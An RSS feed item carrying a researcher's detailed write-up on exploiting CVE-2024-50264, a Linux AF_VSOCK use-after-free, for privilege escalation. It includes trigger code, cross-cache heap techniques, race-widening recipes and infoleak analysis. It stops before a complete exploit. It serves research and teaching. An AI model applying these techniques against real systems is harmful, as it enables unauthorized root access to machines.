<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Hacker News: Front Page</title>
        <link>https://news.ycombinator.com/</link>
        <description>Hacker News RSS</description>
        <lastBuildDate>Wed, 03 Sep 2025 07:50:45 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>github.com/Prabesh01/hnrss-content-extract</generator>
        <language>en</language>
        <atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/frontpage.rss" rel="self" type="application/rss+xml"/>
        <item>
            <title><![CDATA[Kernel-hack-drill and exploiting CVE-2024-50264 in the Linux kernel]]></title>
            <link>https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45112996</guid>
            <description><![CDATA[Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project kernel-hack-drill and show how it helped me to exploit CVE-2024-50264.]]></description>
            <content:encoded><![CDATA[
        

  

  
    Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project kernel-hack-drill and show how it helped me to exploit CVE-2024-50264.

Bug collision story

I first found a bug in AF_VSOCK back in 2021 and published the article Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in AF_VSOCK. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (kworker). Convinced the path forward would be painful, I shelved the bug. This was a wrong decision.

Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim (@v4bel) and Wongi Lee (@qwerty): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. Their patch turned my PoC exploit into a null-ptr-deref:




Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.

Viktor Vasnetsov: Vityaz at the Crossroads (1882)


The exploit strategy by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.

CVE-2024-50264 analysis

The vulnerability CVE-2024-50264 was introduced in August 2016 by commit 06a8fc78367d in Linux v4.8. It is a race condition in AF_VSOCK sockets that happens between the connect() system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.

The kernel uses a freed virtio_vsock_sock object. Its size is 80 bytes, which is suitable for the kmalloc-96 slab cache. The memory corruption is a UAF write executed by a kernel worker.

However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that it's the worst bug to exploit I've ever seen. The Pwnie Award is well-deserved. I'll outline those constraints shortly.

Reproducing the bug using an "immortal signal"

First, an attacker should create a listening virtual socket (server vsock):
int ret = -1;
int vsock1 = 0;

vsock1 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock1 < 0)
	err_exit("[-] creating vsock");

ret = bind(vsock1, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));
if (ret != 0)
	err_exit("[-] binding vsock");

ret = listen(vsock1, 0); /* backlog = 0 */
if (ret != 0)
	err_exit("[-] listening vsock");


Then the attacker should try to open a connection from a client vsock:
#define UAF_PORT 0x2712

int vsock2 = 0;
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_LOCAL
};

vsock2 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock2 < 0)
	err_exit("[-] creating vsock");

ret = connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));


To trigger the bug, the attacker should interrupt this connect() system call with a POSIX signal. @v4bel & @qwerty used SIGKILL, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:

struct sigevent sev = {};
timer_t race_timer = 0;

sev.sigev_notify = SIGEV_SIGNAL;
sev.sigev_signo = 33;
ret = timer_create(CLOCK_MONOTONIC, &sev, &race_timer);


My fuzzer discovered that a timer can fire signal 33 and interrupt connect(). Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As man 7 nptl explains:


  NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33).
One of these signals is used to support thread cancellation and POSIX timers (see timer_create(2));
the other is used as part of a mechanism that ensures all threads in a process always have
the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.


True, these signals cannot be used in applications, but they are perfect for my exploit 😉




I use timer_settime() for race_timer, which lets me choose the exact moment signal 33 interrupts connect(). Moreover, the signal is invisible to the exploit process and doesn't kill it.

About memory corruption

The race condition succeeds when a signal interrupts the connect() system call while the vulnerable socket is in the TCP_ESTABLISHED state. The socket then drops into the TCP_CLOSING state:

if (signal_pending(current)) {
	err = sock_intr_errno(timeout);
	sk->sk_state = sk->sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
	sock->state = SS_UNCONNECTED;
	vsock_transport_cancel_pkt(vsk);
	vsock_remove_connected(vsk);
	goto out_wait;
}


The second attempt to connect the vulnerable vsock to the server vsock using a different svm_cid (VMADDR_CID_HYPERVISOR) provokes memory corruption.

struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_HYPERVISOR
};

/* this connect will schedule the kernel worker performing UAF */
ret = connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));


Under the hood, the connect() system call executes vsock_assign_transport(). This function switches the virtual socket to the new svm_cid transport and frees the resources tied to the previous vsock transport:
if (vsk->transport) {
	if (vsk->transport == new_transport)
		return 0;

	/* transport->release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */
	vsk->transport->release(vsk);
	vsock_deassign_transport(vsk);
}


This procedure closes the old vsock transport in virtio_transport_close() and frees the virtio_vsock_sock object in virtio_transport_destruct(). However, due to the erroneous TCP_CLOSING state of the socket, virtio_transport_close() initiates further communication. To handle that activity, the kernel schedules a kworker that eventually calls virtio_transport_space_update(), which operates on the freed structure:

static bool virtio_transport_space_update(struct sock *sk, struct sk_buff *skb)
{
	struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
	struct vsock_sock *vsk = vsock_sk(sk);
	struct virtio_vsock_sock *vvs = vsk->trans; /* ptr to freed object */
	bool space_available;

	if (!vvs)
		return true;

	spin_lock_bh(&vvs->tx_lock); /* proceed if 4 bytes are zero (UAF write non-zero to lock) */
	vvs->peer_buf_alloc = le32_to_cpu(hdr->buf_alloc); /* UAF write 4 bytes */
	vvs->peer_fwd_cnt = le32_to_cpu(hdr->fwd_cnt); /* UAF write 4 bytes */
	space_available = virtio_transport_has_space(vsk); /* UAF read, not interesting */
	spin_unlock_bh(&vvs->tx_lock); /* UAF write, restore 4 zero bytes */
	return space_available;
}


The following diagram shows the layout of the UAF in the vulnerable object:




Here in yellow I show the tx_lock field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the peer_buf_alloc and peer_fwd_cnt fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.

The value written to virtio_vsock_sock.peer_buf_alloc can be controlled from the userspace:

/* Increase the range for the value that we want to write during UAF: */
uaf_val_limit = 0x1lu; /* can't be zero */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
           &uaf_val_limit, sizeof(uaf_val_limit));
uaf_val_limit = 0xfffffffflu;
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
           &uaf_val_limit, sizeof(uaf_val_limit));

/* Set the 4-byte value that we want to write during UAF: */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
           &uaf_val, sizeof(uaf_val));


The field virtio_vsock_sock.peer_fwd_cnt tracks how many bytes have been pushed through vsock using sendmsg()/recvmsg(). It is zero by default (four zero bytes).

Not so fast. CVE-2024-50264 has limitations

As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:


  The vulnerable virtio_vsock_sock client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.
  Reproducing this race condition is very unstable.
  The UAF write occurs in a kworker a few microseconds after kfree(), too quickly for typical cross-cache attacks.
  A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.
  Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after VSOCK_CLOSE_TIMEOUT (eight seconds).
  The kworker hangs in spin_lock_bh() if virtio_vsock_sock.tx_lock is not zero, as noted above.


I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I've ever seen. I guess that's why it received the Pwnie Award 2025 as the Best Privilege Escalation.




First thoughts on exploit strategy

The exploit strategy by @v4bel and @qwerty was complex:


  A large-scale BPF JIT spray that filled a significant portion of physical memory
  The SLUBStick technique from Graz University of Technology, which allowed to:
    
      Determine the number of objects in the active slab using a timing side channel
      Then, place the client and server virtio_vsock_sock objects in different slabs, landing one at the end of its slab and the other at the start of the next slab
    
  
  The Dirty Pagetable technique, which allowed to use the UAF object for overwriting a page table entry (PTE)
  Modifying a PTE to make it possibly point to a BPF JIT region
  Inserting a privilege-escalation payload into the BPF code
  Communicating via a socket to execute the privilege-escalation payload.





I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.

I decided not to search victim objects inside the kmalloc-96 slab cache. Ubuntu Server 24.04 ships with kconfig options that neutralize naive heap spraying for UAF exploitation:

  CONFIG_SLAB_BUCKETS=y, which creates a set of separate slab caches for allocations with user-controlled data
  CONFIG_RANDOM_KMALLOC_CACHES=y. Here's a quote from the kernel documentation about it:
    
      It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.
    
  


That's why I decided to perform the cross-cache attack anyway.

The first victim object I decided to try was struct cred. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim cred, because slabs for the vulnerable virtio_vsock_sock have size 96 bytes (half of 192). The diagram below shows how two vulnerable virtio_vsock_sock objects overlap the cred object. The memory corruption may happen on one of the virtio_vsock_sock objects.




Unfortunately, struct cred reallocated at the place of the freed virtio_vsock_sock objects doesn't provide anything useful for the attacker:

  If the UAF happened on the first virtio_vsock_sock, the kernel would hang in spin_lock_bh(), because cred has a non-null uid value at the place of virtio_vsock_sock.tx_lock.
  If the UAF happened on the second virtio_vsock_sock, writing controlled data to virtio_vsock_sock.peer_buf_alloc would corrupt the cred.request_key_auth pointer. I had no idea how to use it without a prior infoleak.


The cred object didn't work for me, so I started to search for the next candidate. My next victim object for the memory corruption was msg_msg. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article "Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel").

It was a novel approach back then. This time, I set out to create something new again.

I chose a 96-byte msg_msg because the slab allocator would use slabs of the same size for this msg_msg and virtio_vsock_sock. That would allow the UAF write to land at a fixed offset in the victim msg_msg object. The following diagram shows what happens with the msg_msg object allocated at the place of the freed virtio_vsock_sock:




The msg_msg.m_list.prev is the kernelspace pointer to the previous object in the linked list. This pointer is zero when msg_msg is created (see CONFIG_INIT_ON_ALLOC_DEFAULT_ON) and then it is initialized with a non-null value when msg_msg is inserted into the message queue. Unfortunately, this non-null pointer is interpreted as virtio_vsock_sock.tx_lock. That makes the virtio_transport_space_update() function hang while executing spin_lock_bh().

To bypass this restriction, I needed the kernel to initialize msg_msg.m_list.prev after the UAF write. I looked for a way to postpone placing msg_msg in the message queue and eventually found the solution.

msg_msg spray allowing m_list field corruption (novel technique)


  I filled the message queue almost completely before sending the target msg_msg.
    
      The message queue size is MSGMNB=16384 bytes.
      I sent 2 clogging messages of 8191 bytes each without calling the msgrcv() syscall.
      Only 2 bytes were left in the queue.
      I used mtype = 1 for these messages.
    
  
  Then I performed spraying by calling msgsnd() for the target msg_msg objects.
    
      I called the msgsnd() syscall in separate pthreads and used mtype = 2 for these messages to distinguish them from the clogging messages.
      The kernel allocates target msg_msg and then blocks msgsnd() in ipc/msg.c while it waits for space in the message queue:
    

     	if (msg_fits_inqueue(msq, msgsz))
 		break;
    
 	/* queue full, wait: */
 	if (msgflg & IPC_NOWAIT) {
 		err = -EAGAIN;
 		goto out_unlock0;
 	}
    
 	/* enqueue the sender and prepare to block */
 	ss_add(msq, &s, msgsz);
    
 	if (!ipc_rcu_getref(&msq->q_perm)) {
 		err = -EIDRM;
 		goto out_unlock0;
 	}
    
 	ipc_unlock_object(&msq->q_perm);
 	rcu_read_unlock();
 	schedule();


    
    
  
  
    While the msgsnd() syscalls were waiting for space in the message queue, I performed the UAF write corrupting the m_list, m_type, and m_ts fields of one of the target msg_msg objects.
  
  
    After the UAF write, I called msgrcv() for type 1 clogging messages.
  
  Then the blocked msgsnd() syscall woke up to add the sprayed msg_msg to the queue and the kernel fixed the corrupted m_list field:
     	if (!pipelined_send(msq, msg, &wake_q)) {
 		/* no one is waiting for this message, enqueue it */
 		list_add_tail(&msg->m_list, &msq->q_messages);
 		msq->q_cbytes += msgsz;
 		msq->q_qnum++;
 		percpu_counter_add_local(&ns->percpu_msg_bytes, msgsz);
 		percpu_counter_add_local(&ns->percpu_msg_hdrs, 1);
 	}

  


Cool! This technique is also useful for blind overwriting of msg_msg using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted m_list pointers. In my particular case, this approach allowed me to avoid virtio_transport_space_update() hanging in spin_lock_bh():




To implement the UAF write into an msg_msg object, I needed to perform cross-cache attack turning virtio_vsock_sock into msg_msg. On Ubuntu Server 24.04, the virtio_vsock_sock objects live in one of 16 kmalloc-rnd-?-96 slab caches enabled by CONFIG_RANDOM_KMALLOC_CACHES. The msg_msg objects live in a dedicated msg_msg-96 slab cache enabled by CONFIG_SLAB_BUCKETS.

To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:


  If an unstable race condition creates problems, let's use a testing ground for developing the exploit primitives!




Back in 2017, I created a pet project for my students called kernel-hack-drill. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use kernel-hack-drill to develop the exploit primitives for CVE-2024-50264.

kernel-hack-drill is an open-source project published under the GPL-3.0 license. It contains the following parts:

  drill_mod.c is a small Linux kernel module that provides the /proc/drill_act file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.
  drill.h is a header file describing the drill_mod.ko interface:
    enum drill_act_t {
	DRILL_ACT_NONE = 0,
	DRILL_ACT_ALLOC = 1,
	DRILL_ACT_CALLBACK = 2,
	DRILL_ACT_SAVE_VAL = 3,
	DRILL_ACT_FREE = 4,
	DRILL_ACT_RESET = 5
};
  
#define DRILL_ITEM_SIZE 95
  
struct drill_item_t {
	unsigned long foobar;
	void (*callback)(void);
	char data[]; /* C99 flexible array */
};
  
#define DRILL_N 10240

  
  drill_test.c is a userspace test for drill_mod.ko that provides the examples of using /proc/drill_act. This test doesn't provoke memory corruptions in drill_mod.ko and it passes if CONFIG_KASAN=y.
  README.md includes a detailed step-by-step setup guide on how to use kernel-hack-drill (kudos to the contributors!).


Fun fact: when I chose the name kernel-hack-drill for this project, I used the word drill to mean training or workout for Linux kernel security. My friends and students read it differently. They thought I meant something like this:




The kernel-hack-drill project is a bit similar to KRWX, but much simpler. Moreover, it ships with ready-made PoC exploits:

  drill_uaf_callback.c: a UAF exploit that invokes a callback inside a freed drill_item_t structure. It hijacks control flow and gains LPE.
  drill_uaf_w_msg_msg.c: a UAF exploit that writes into a freed drill_item_t. It uses a cross-cache attack and overwrites msg_msg.m_ts enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.
  drill_uaf_w_pipe_buffer.c: a UAF exploit that writes into a freed drill_item_t. It performs a cross-cache attack and overwrites pipe_buffer.flags to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.


Recent contributions added new variants (kudos to the contributors!):

  drill_uaf_callback_rop_smep.c: an improved version of drill_uaf_callback.c that adds a ROP chain to bypass SMEP on x86_64.
  drill_uaf_w_pte.c: a UAF exploit that writes to a freed drill_item_t. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on x86_64.
  drill_uaf_w_pud.c: an improved version of __drill_uaf_w_pte.c__ that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.


When I revisited kernel-hack-drill during my CVE-2024-50264 work, this spare-time project hadn't seen an update in years. But now kernel-hack-drill offers a solid set of resources that Linux kernel security researchers can explore.

Experimenting with cross-cache attack using kernel-hack-drill

My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.

I implemented a standard cross-cache attack in drill_uaf_w_msg_msg.c. You can see the full code in the repository, so I'll sketch the flow here. For background, I highly recommend Andrey Konovalov's talk SLUB Internals for Exploit Developers.

To plan the attack, I pulled the needed info from /sys/kernel/slab. The slab caches that hold virtio_vsock_sock (80 bytes) or drill_item_t (95 bytes) each keep 120 slabs in per-CPU partial lists (cpu_partial=120) and 42 objects in each slab (objs_per_slab=42).

The cross-cache attack algorithm:

  Allocate objs_per_slab objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.
  Allocate objs_per_slab * cpu_partial objects. This creates the cpu_partial number of full slabs that will later populate the partial list at step 6.
  Create a slab that contains the UAF object. Allocate objs_per_slab objects and keep a dangling reference to the vulnerable object in that slab.
  Create a new active slab again: allocate objs_per_slab objects. This step is very important for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.
  Completely free the slab that holds the UAF object. To do that, free (objs_per_slab * 2 - 1) of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.
  Fill up the partial list: free one of each objs_per_slab objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.
  Reclaim the page that contained the UAF object for another slab cache: spray the target msg_msg objects. As a result, one msg_msg is allocated where the vulnerable object (drill_item_t in my case) used to be.
  Exploit the UAF! Overwrite msg_msg.m_ts to read kernel memory out of bounds.


I've seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I'll fill that gap.

Let's examine the attack in drill_uaf_w_msg_msg.c. To watch it in action and debug it, make the following tweaks in your kernel sources:
diff --git a/mm/slub.c b/mm/slub.c
index be8b09e09d30..e45f055276d1 100644
--- a/mm/slub.c
+++ b/mm/slub.c
@@ -3180,6 +3180,7 @@ static void __put_partials(struct kmem_cache *s, struct slab *partial_slab)
        while (slab_to_discard) {
                slab = slab_to_discard;
                slab_to_discard = slab_to_discard->next;
+               printk("__put_partials: cache 0x%lx slab 0x%lx\n", (unsigned long)s, (unsigned long)slab);
 
                stat(s, DEACTIVATE_EMPTY);
                discard_slab(s, slab);

diff --git a/ipc/msgutil.c b/ipc/msgutil.c
index c7be0c792647..21af92f531d6 100644
--- a/ipc/msgutil.c
+++ b/ipc/msgutil.c
@@ -64,6 +64,7 @@ static struct msg_msg *alloc_msg(size_t len)
        msg = kmem_buckets_alloc(msg_buckets, sizeof(*msg) + alen, GFP_KERNEL);
        if (msg == NULL)
                return NULL;
+       printk("msg_msg 0x%lx\n", (unsigned long)msg);
 
        msg->next = NULL;
        msg->security = NULL;


In __put_partials() I print the address of the slab that returns to the page allocator when discard_slab() runs. In alloc_msg() I print the kernel address of each newly allocated msg_msg object.

When the cross-cache attack succeeds, the slab that held drill_item_t objects is handed back to the page allocator and then reused for msg_msg objects. Running the PoC exploit drill_uaf_w_msg_msg makes this visible, as we observe:

  In the kernel log:
    [   32.719582] drill: kmalloc'ed item 5123 (0xffff88800c960660, size 95)

  
  Then in stdout:
    [+] done, current_n: 5124 (next for allocating)
[!] obtain dangling reference from use-after-free bug
[+] done, uaf_n: 5123

  
  Then in GDB (using with bata24/gef):
    gef> slab-contains 0xffff88800c960660
[+] Wait for memory scan
slab: 0xffffea0000325800
kmem_cache: 0xffff888003c45300
base: 0xffff88800c960000
name: kmalloc-rnd-05-96  size: 0x60  num_pages: 0x1

  
  Finally, in the kernel log:
    [   36.778165] drill: free item 5123 (0xffff88800c960660)
...
[   36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800
...
[   36.892053] msg_msg 0xffff88800c960660

  


We see the drill_item_t object 0xffff88800c960660 in slab 0xffffea0000325800 reallocated as msg_msg, which confirms that the cross-cache attack worked.

After experimenting with kernel-hack-drill on Ubuntu Server 24.04, I found that CONFIG_RANDOM_KMALLOC_CACHES and CONFIG_SLAB_BUCKETS block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:




It seems that, without a mitigation such as SLAB_VIRTUAL, the Linux kernel remains wide-open to cross-cache attacks.

Adapting the cross-cache attack to CVE-2024-50264

As noted in the limitations, the vulnerable virtio_vsock_sock client object is allocated together with the server object (Limitation #1). That hurts the exploit for two reasons:

  On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.
  On the other hand, closing the server vsock disturbs the UAF itself.


How to deal with it? @v4bel and @qwerty used the SLUBStick timing side channel to spot when the allocator switched to a new active slab. I went another way:

  What if I hit the connect() syscall with a signal almost immediately?


In short, I used one more race condition to exploit the main race condition – and it worked:

  I sent the "immortal" signal 33 to the vulnerable connect() syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.
  Then I verified the early race condition:
    
      The connect() syscall must return "Interrupted system call"
      Another testing client vsock should still connect to the server vsock without trouble
    
  


I discovered that when both checks passed, only a single vulnerable virtio_vsock_sock for the client vsock was created. The interrupting signal arrived before the kernel could create the second virtio_vsock_sock for the server vsock. This bypassed Limitation #1 (paired-object creation). After that, I sent signal 33 again – this time after the normal timeout – to interrupt the vulnerable connect() a second time and provoke the UAF. The cross-cache attack against virtio_vsock_sock was unlocked!

Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in Limitation #2. My race condition "speedrun" also eased Limitation #5: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at VSOCK_CLOSE_TIMEOUT (8 seconds).

To address Limitation #4 (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering connect(), I called listen() on the vulnerable vsock. If listen() ran before the kworker, it changed the vsock state to TCP_LISTEN, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.

At that point my list of CVE-2024-50264 limitations looked like this:

  The vulnerable virtio_vsock_sock client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.
  Reproducing this race condition is very unstable.
  The UAF write occurs in a kworker a few microseconds after kfree(), too quickly for typical cross-cache attacks.
  A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.
  Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after VSOCK_CLOSE_TIMEOUT (eight seconds).
  The kworker hangs in spin_lock_bh() if virtio_vsock_sock.tx_lock is not zero.


With the early-signal trick in place, only two limitations were still blocking my exploit.

Oh so slow! The cross-cache attack shows up late to the party

As noted in Limitation #3, the UAF write in the kworker fires only a few μs after kfree() for the virtio_vsock_sock. A cross-cache attack needs much more time, so the UAF write lands on the original virtio_vsock_sock and never reaches the msg_msg.




I didn't know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn's article Racing against the clock. It allowed to make my kworker slower than a sluggish cross-cache attack.

The main idea is to hammer the kworker with a timerfd watched by a huge pile of epoll instances. Here is the short recipe (see Jann's article for full detail):

  Call timerfd_create(CLOCK_MONOTONIC, 0).
  Create 8 forks.
  In each fork, call dup() for the timerfd 100 times.
  In each fork, call epoll_create() 500 times.
  For every epoll instance, use epoll_ctl() to add all duplicated file descriptors to the interest list – each epoll instance now monitors all available timerfd copies.
  Finally, arm the timerfd so the interrupt hits the kworker at just the right moment:
    timerfd_settime(timerfd, TFD_TIMER_CANCEL_ON_SET, &retard_tmo, NULL)

  


This procedure made my race-condition window around 80 times longer.

I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in /proc/sys/fs/epoll/max_user_watches, epoll_ctl() fails. From man 7 epoll:

  This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.


On Ubuntu Server 24.04 with 2 GiB of RAM, /proc/sys/fs/epoll/max_user_watches is 431838, which is not huge. I could afford 8 forks × 500 epoll instances × 100 duplicated file descriptors, for a total of 400000 epoll watches.

That was just enough to beat Limitation #3, and I finally got msg_msg data size corruption: the vsock UAF changed msg_msg.m_ts from 48 bytes to 8192 (MSGMAX). Now I could do out-of-bounds reading of the kernel memory using the msgrcv() syscall.

Sorting the loot

The corrupted msg_msg allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address 0xffffffff8233cfa0 [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the socket_file_ops() kernel function. I was excited to discover that this function pointer is part of struct file, because the file kernel object also contains the f_cred pointer [2], which leaked as well.

Here's how I examined the memory leaked by msg_msg at 0xffff88800e75d600:
gef> p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
$61 = {
  f_count = {
    counter = 0x0
  },
  f_lock = {
    {
      rlock = {
        raw_lock = {
          {
            val = {
              counter = 0x0
            },
            {
              locked = 0x0,
              pending = 0x0
            },
            {
              locked_pending = 0x0,
              tail = 0x0
            }
          }
        }
      }
    }
  },
  f_mode = 0x82e0003,
  f_op = 0xffffffff8233cfa0 <socket_file_ops>,    [1]
  f_mapping = 0xffff88800ee66f60,
  private_data = 0xffff88800ee66d80,
  f_inode = 0xffff88800ee66e00,
  f_flags = 0x2,
  f_iocb_flags = 0x0,
  f_cred = 0xffff888003b7ad00,                    [2]
  f_path = {
    mnt = 0xffff8880039cec20,
    dentry = 0xffff888005b30b40
  },
  ...


As a result, my PoC exploit obtained a pointer to struct cred, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.

In search of arbitrary address writing primitive

The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I've done the following:

  Looked through dozens of kernel objects,
  Read many kernel exploit write-ups,
  Tried Kernel Exploitation Dashboard by Eduardo Vela and the KernelCTF team.


One idea was to combine my limited UAF write with the Dirty Page Table attack (well described by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.

I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:

  Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.
  Using the KASLR infoleak from my msg_msg out-of-bounds read. I decided to try that.


I ran a quick experiment to see how KASLR behaves on X86_64 with CONFIG_RANDOMIZE_BASE and CONFIG_RANDOMIZE_MEMORY enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel _text.

VM run #1:
gef> ksymaddr-remote
[+] Wait for memory scan
0xffffffff98400000 T _text

gef> v2p 0xffffffff98400000
Virt: 0xffffffff98400000 -> Phys: 0x57400000


VM run #2:
gef> ksymaddr-remote
[+] Wait for memory scan
0xffffffff81800000 T _text

gef> v2p 0xffffffff81800000
Virt: 0xffffffff81800000 -> Phys: 0x18600000


Then I calculated the difference between the virtual and physical addresses:

  VM run #1: 0xffffffff98400000 − 0x57400000 = 0xffffffff41000000
  VM run #2: 0xffffffff81800000 − 0x18600000 = 0xffffffff69200000


Because 0xffffffff41000000 is not equal to 0xffffffff69200000, leaking the virtual KASLR offset doesn't help against physical KASLR.




Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.

I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on pipe_buffer.

When a pipe is created with the pipe() system call, the kernel allocates an array of pipe_buffer structures. Each pipe_buffer item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:




This object looked like a good UAF target. I could make a pipe_buffer array the same size as virtio_vsock_sock by changing the capacity of the pipe: fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2). The kernel changes the array size to 2 * sizeof(struct pipe_buffer) = 80 bytes, exactly matching the virtio_vsock_sock size.

In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip pipe_buffer.flags, just as in Max Kellermann's original Dirty Pipe attack.




